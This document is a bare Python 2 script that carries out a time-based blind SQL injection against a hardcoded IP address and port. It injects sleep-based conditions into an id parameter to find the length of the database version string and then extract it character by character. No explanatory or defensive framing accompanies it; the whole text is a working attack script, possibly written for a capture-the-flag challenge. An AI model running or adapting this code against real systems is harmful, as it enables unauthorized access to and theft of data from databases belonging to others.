import requests
import time
payload='1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.!@#$+=-'
data=''
print 'Judgment of data length...'
for i in range(1,20):
    url='http://103.238.227.13:10084/index.php?id=1 AND if((SELECT length(version()))='+str(i)+',sleep(6),0)'
    starttime=time.time()
    response=requests.get(url)
    if time.time()-starttime>5:
        print 'the data length is:'+str(i)
        break
print 'Extract data...It will takes about '+str(i*6)+' seconds'
for j in range(1,i+1):
    for payloads in payload:
        url='http://103.238.227.13:10084/index.php?id=1 AND if(version() like "'+data+payloads+'%",sleep(6),0)'
        starttime=time.time()
        reponse=requests.get(url)
        if time.time()-starttime>5:
            data+=payloads
            print data
            break
print 'the final result is:'+data
